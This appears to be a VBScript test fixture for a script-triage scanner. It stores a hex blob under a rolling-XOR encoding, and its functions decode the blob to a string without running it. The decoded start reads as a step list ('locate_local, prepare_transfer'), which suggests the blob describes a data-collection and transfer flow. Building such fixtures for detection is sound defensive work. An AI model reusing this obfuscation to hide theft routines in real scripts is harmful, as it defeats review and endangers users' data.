Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_c999bc54 = "55:68:59:25:56:22:47:37:44:79:15:7a:19:78:0c:69:36:5a:35:56:37:5b:77:07:75:10:60:01:73:16:49:3d:4f:2e:40:33:55:30:42:6e:1b:6b:07:68:09:6d:32:40:25:48:27:53:36:4a:2b:4f:2e:5e:2a:4f:3d:00:4d:1e:46:0b:47:75:5b:08:6d:1f:69:0c:7e:26:6b:27:6f:3b:6f:3f:11:27:09:39:45:36:42:23:44:21:7e:1d:72:07:69:1d:20:12:6e:0d:6c:01:71:10:79:1e:70:2f:46:22:1f:7c:1d:70:00:61:08:6f:01:2c:4f:78:1e:2a:49:78:1a:78:48:2c:50:25:57:3b:06:6e:1a:6e:1e:6d:57:78:57:34:03:65:51:32:03:61:03:33:57:79:1c:64:05:68:18:74:11:3f:56:38:4e:2f:43:2a:4e:61:00:37:54:37:02:3a:58:6a:44:20:41:35:49:3c:4f:2a:58:07:66:01:64:0a:7e:43:0b:7e:10:64:16:73:00:73:3f:5e:3c:13:70:47:21:15:76:47:25:47:77:13:6f:09:60:0c:69:36:46:27:53:3b:06:45:7f:23:76:05:60:12:61:3d:6d:18:7a:16:7f:1c:40:08:7d:13:67:15:70:03:70:3c:5d:3f:63:10:64:05:62:07:2a:49:7e:18:2c:4f:7e:1c:7e:4e:2a:04:60:01:75:09:7c:0c:60:0f:6e:0a:55:20:52:3e:03:6b:1f:6b:1b:68:52:7d:52:31:06:60:54:37:06:64:06:36:52:7c:19:61:00:6d:1d:71:14:3a:53:3d:4b:2a:46:2f:4b:64:11:61:0d:62:03:67:48:78:4b:7b:42:24:1c:78:4e"
Const Codec_c999bc54 = "hex_colon|rolling_xor|23"

Function Load_c999bc54()
  Dim parts, result(), i
  parts = Split(Material_c999bc54, ":")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(i) = CInt("&H" & parts(i))
  Next
  Load_c999bc54 = result
End Function

Function Decode_c999bc54(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  previous = 35
  For i = 0 To UBound(s)
    result(i) = s(i) Xor previous
    previous = s(i)
  Next
  Decode_c999bc54 = result
End Function

Function Recover_c999bc54()
  Dim s, d, t, n, i, p, e, q
  n = Join(Array("north", "south"), ":")

  s = Load_c999bc54()

  Do

    d = Decode_c999bc54(s)

    Exit Do

  Loop

  t = ""

  For i = 0 To UBound(d)

    t = t & Chr(d(i))

  Next
  Recover_c999bc54 = t
End Function

Function Inspect_c999bc54()
  Inspect_c999bc54 = Recover_c999bc54()
End Function
